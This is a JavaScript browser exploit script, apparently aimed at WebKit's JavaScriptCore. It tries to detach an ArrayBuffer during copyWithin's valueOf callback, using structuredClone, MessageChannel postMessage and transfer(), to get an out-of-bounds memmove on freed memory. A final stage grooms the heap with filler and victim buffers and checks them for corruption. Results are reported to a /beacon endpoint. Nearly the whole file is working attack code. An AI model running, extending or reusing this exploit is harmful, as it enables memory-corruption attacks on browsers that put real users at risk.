/*
 * p419 -- DETACH-based OOB via copyWithin valueOf
 *
 * V416/V418 showed resize() keeps the same physical allocation
 * (maxByteLength is pre-allocated). No real OOB from resize.
 *
 * NEW APPROACH: Detach the AB during valueOf via transfer.
 * Detach FREES the backing store to bmalloc.
 * memmove then accesses freed memory -> real OOB.
 *
 * Transfer methods to test:
 * T1: structuredClone(ab, {transfer: [ab]})
 * T2: postMessage to self with transfer
 * T3: ArrayBuffer.prototype.transfer() (ES2024)
 * T4: Worker postMessage with transfer
 *
 * If we can detach during valueOf, the memmove reads/writes freed heap memory.
 * If bmalloc has reused that freed memory with victim objects, we corrupt them.
 *
 * Beacon prefix: V419-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V419-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// T0: Feature detection
// ================================================================
function t0_features() {
  var feats = {};

  // Check structuredClone transfer
  try {
    var tab = new ArrayBuffer(8);
    var tab2 = structuredClone(tab, {transfer: [tab]});
    feats.scTransfer = tab.byteLength === 0 ? "YES-DETACHED" : "NO-STILL-" + tab.byteLength;
    feats.scTransferNew = tab2.byteLength;
  } catch(e) {
    feats.scTransfer = "ERR:" + e.message.slice(0, 60);
  }

  // Check RAB transfer
  try {
    var rab = new ArrayBuffer(64, {maxByteLength: 256});
    var rab2 = structuredClone(rab, {transfer: [rab]});
    feats.rabTransfer = rab.byteLength === 0 ? "YES-DETACHED" : "NO-STILL-" + rab.byteLength;
    feats.rabTransferNew = rab2.byteLength + ":" + (rab2.maxByteLength || "nomax");
  } catch(e) {
    feats.rabTransfer = "ERR:" + e.message.slice(0, 60);
  }

  // Check ArrayBuffer.prototype.transfer
  try {
    var tab3 = new ArrayBuffer(8);
    if (typeof tab3.transfer === "function") {
      var tab4 = tab3.transfer();
      feats.abTransfer = tab3.byteLength === 0 ? "YES" : "NO";
    } else {
      feats.abTransfer = "NOT-AVAILABLE";
    }
  } catch(e) {
    feats.abTransfer = "ERR:" + e.message.slice(0, 60);
  }

  // Check MessageChannel
  try {
    var mc = new MessageChannel();
    feats.messageChannel = "YES";
  } catch(e) {
    feats.messageChannel = "ERR:" + e.message.slice(0, 40);
  }

  B("T0-FEATS", feats);
  return feats;
}

// ================================================================
// T1: structuredClone transfer during copyWithin valueOf
// ================================================================
function t1_sc_detach() {
  B("T1-START");

  // Create a regular (non-resizable) AB for cleaner testing
  var SIZE = 4096;
  var ab = new ArrayBuffer(SIZE);
  var u8 = new Uint8Array(ab);

  // Fill with marker
  for (var i = 0; i < SIZE; i++) u8[i] = 0xAA;

  var detached = false;
  var detachErr = null;
  var copyErr = null;

  try {
    u8.copyWithin(0, {
      valueOf: function() {
        try {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
        } catch(e) {
          detachErr = e.message;
        }
        return 2048; // copy from offset 2048
      }
    });
  } catch(e) {
    copyErr = e.message;
  }

  B("T1-RESULT", {
    detached: detached,
    detachErr: detachErr ? detachErr.slice(0, 60) : null,
    copyErr: copyErr ? copyErr.slice(0, 60) : null,
    abLen: ab.byteLength
  });

  // If detach worked and copyWithin didn't throw, we have OOB!
  if (detached && !copyErr) {
    B("T1-OOB-CONFIRMED", "memmove ran on freed memory!");
    return true;
  }

  return false;
}

// ================================================================
// T2: Same but with RAB
// ================================================================
function t2_rab_detach() {
  B("T2-START");

  var ab = new ArrayBuffer(4096, {maxByteLength: 16384});
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xBB;

  var detached = false;
  var detachErr = null;
  var copyErr = null;

  try {
    u8.copyWithin(0, {
      valueOf: function() {
        try {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
        } catch(e) {
          detachErr = e.message;
        }
        return 2048;
      }
    });
  } catch(e) {
    copyErr = e.message;
  }

  B("T2-RESULT", {
    detached: detached,
    detachErr: detachErr ? detachErr.slice(0, 60) : null,
    copyErr: copyErr ? copyErr.slice(0, 60) : null,
    abLen: ab.byteLength
  });

  if (detached && !copyErr) {
    B("T2-OOB-CONFIRMED", "RAB memmove on freed memory!");
    return true;
  }

  return false;
}

// ================================================================
// T3: Transfer via postMessage to self (MessageChannel)
// ================================================================
function t3_postmessage_detach() {
  B("T3-START");

  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xCC;

  var detached = false;
  var detachErr = null;
  var copyErr = null;

  try {
    var mc = new MessageChannel();
    u8.copyWithin(0, {
      valueOf: function() {
        try {
          mc.port1.postMessage(ab, [ab]);
          detached = (ab.byteLength === 0);
        } catch(e) {
          detachErr = e.message;
        }
        return 2048;
      }
    });
  } catch(e) {
    copyErr = e.message;
  }

  B("T3-RESULT", {
    detached: detached,
    detachErr: detachErr ? detachErr.slice(0, 60) : null,
    copyErr: copyErr ? copyErr.slice(0, 60) : null,
    abLen: ab.byteLength
  });

  if (detached && !copyErr) {
    B("T3-OOB-CONFIRMED", "postMessage detach + memmove!");
    return true;
  }

  return false;
}

// ================================================================
// T4: ArrayBuffer.prototype.transfer()
// ================================================================
function t4_transfer_method() {
  B("T4-START");

  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xDD;

  if (typeof ab.transfer !== "function") {
    B("T4-SKIP", "no transfer method");
    return false;
  }

  var detached = false;
  var detachErr = null;
  var copyErr = null;

  try {
    u8.copyWithin(0, {
      valueOf: function() {
        try {
          ab.transfer();
          detached = (ab.byteLength === 0);
        } catch(e) {
          detachErr = e.message;
        }
        return 2048;
      }
    });
  } catch(e) {
    copyErr = e.message;
  }

  B("T4-RESULT", {
    detached: detached,
    detachErr: detachErr ? detachErr.slice(0, 60) : null,
    copyErr: copyErr ? copyErr.slice(0, 60) : null,
    abLen: ab.byteLength
  });

  if (detached && !copyErr) {
    B("T4-OOB-CONFIRMED", "transfer() detach + memmove!");
    return true;
  }

  return false;
}

// ================================================================
// T5: If any detach+OOB works, try heap corruption
// ================================================================
function t5_exploit(method) {
  B("T5-START", method);

  // Fill heap holes
  var fillers = [];
  for (var i = 0; i < 256; i++) fillers.push(new ArrayBuffer(4096));

  // Allocate trigger
  var triggerAB = new ArrayBuffer(4096);
  var triggerU8 = new Uint8Array(triggerAB);

  // Fill trigger with pattern that will overwrite victims
  // Write 0xFF to all bytes
  for (var i = 0; i < 4096; i++) triggerU8[i] = 0xFF;

  // Allocate victims AFTER trigger
  var victims = [];
  var victimViews = [];
  for (var i = 0; i < 64; i++) {
    var vab = new ArrayBuffer(4096);
    var vu8 = new Uint8Array(vab);
    // Use unsigned comparison this time!
    for (var j = 0; j < 4096; j++) vu8[j] = (j & 0xFF);
    victims.push(vab);
    victimViews.push(vu8);
  }

  B("T5-ALLOC", {fillers: fillers.length, victims: victims.length});

  // Free fillers to create holes, then hope bmalloc reuses trigger's freed memory for... wait
  // Actually we want the opposite: free trigger's memory, then something adjacent gets hit

  // Detach trigger during copyWithin
  var detached = false;
  var copyErr = null;

  try {
    if (method === "sc") {
      triggerU8.copyWithin(0, {
        valueOf: function() {
          structuredClone(triggerAB, {transfer: [triggerAB]});
          detached = true;
          return 0;
        }
      });
    } else if (method === "mc") {
      var mc = new MessageChannel();
      triggerU8.copyWithin(0, {
        valueOf: function() {
          mc.port1.postMessage(triggerAB, [triggerAB]);
          detached = (triggerAB.byteLength === 0);
          return 0;
        }
      });
    }
  } catch(e) {
    copyErr = e.message;
  }

  B("T5-DETACH", {detached: detached, copyErr: copyErr ? copyErr.slice(0, 60) : null});

  if (!detached || copyErr) {
    B("T5-FAIL", "detach failed or copy threw");
    return;
  }

  // Check victims for corruption
  var corrupted = 0;
  var firstCorrupt = -1;
  var corruptDetails = [];

  for (var i = 0; i < victims.length; i++) {
    try {
      var v = victimViews[i];
      for (var j = 0; j < Math.min(64, v.length); j++) {
        var expected = j & 0xFF;
        if (v[j] !== expected) {
          if (firstCorrupt < 0) firstCorrupt = i;
          corrupted++;
          if (corruptDetails.length < 5) {
            corruptDetails.push({
              victim: i, off: j,
              expected: expected,
              got: v[j]
            });
          }
          break;
        }
      }
    } catch(e) {
      B("T5-VREAD-ERR-" + i, e.message);
    }
  }

  B("T5-RESULTS", {corrupted: corrupted, first: firstCorrupt});
  if (corruptDetails.length > 0) {
    B("T5-CORRUPT", corruptDetails);
  }
}

// Run all tests
var feats = t0_features();

var t1ok = t1_sc_detach();
var t2ok = t2_rab_detach();
var t3ok = t3_postmessage_detach();
var t4ok = t4_transfer_method();

// Run exploit if any method works
if (t1ok) t5_exploit("sc");
else if (t3ok) t5_exploit("mc");

B("DONE", {t1: t1ok, t2: t2ok, t3: t3ok, t4: t4ok});
})();
